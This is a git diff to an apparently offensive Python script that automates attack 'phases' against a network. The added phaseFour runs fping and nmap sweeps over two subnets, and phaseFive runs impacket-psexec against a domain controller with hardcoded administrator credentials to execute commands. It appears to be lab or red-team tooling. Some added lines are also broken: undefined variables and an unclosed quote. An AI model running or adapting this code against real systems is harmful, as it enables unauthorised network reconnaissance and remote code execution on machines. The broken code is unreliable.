@@ -35,7 +35,6 @@ def execute_ssh_commands(username, password, host, commands):
         # Close the SSH connection
         client.close()
 
-		
 def phaseOne():
 	# Define attack space 
 	subnet = "208.11.26.0/24"
@@ -217,13 +216,41 @@ def phaseThree():
 	print("done. Executing part two.")
 	phaseThreept2()
 	print("Phase Three done.")
+
+def phaseFour():
+	subnets = [
+	"208.11.20.0/24",
+	"208.11.21.0/24"
+	]
+	# Run fping against the subnet
+	print(f"Running fping against the subnet {subnet[0]}")
+	#subprocess.run(["fping", "-g", subnet[0], "-a",">","alives.txt"])
+	print(f"Running fping against the subnet {subnet[1]}")
+	#subprocess.run(["fping", "-g", subnet[1], "-a",">>","alives.txt])
+	print(f"Running nmap against the target IP {target_ip}")
+	#subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL","alives.txt","-oN","enum.txt"])
+
+def phaseFive():
+	DC1 = "208.11.20.100"
+	username = "administrator"
+	password = "P@ssw0rd"
+	# Define the commands you want to execute
+	commands = [
+	"whoami /priv",
+	"systeminfo"
+	]
+	for command in commands:
+		subprocess.run(f"impacket-psexec {username}:{password}@{DC1} {command}", shell=True, text=True)
+
 def main():
 	# Ensure Sudo Usage
-	check_root()
+	#check_root()
 	# Run phaseOne function
 	#phaseOne
 	#phaseTwo()
-	phaseThree()
+	#phaseThree()
+	#phaseFour()
+	phaseFive()
 
 if __name__ == "__main__":
 	main()
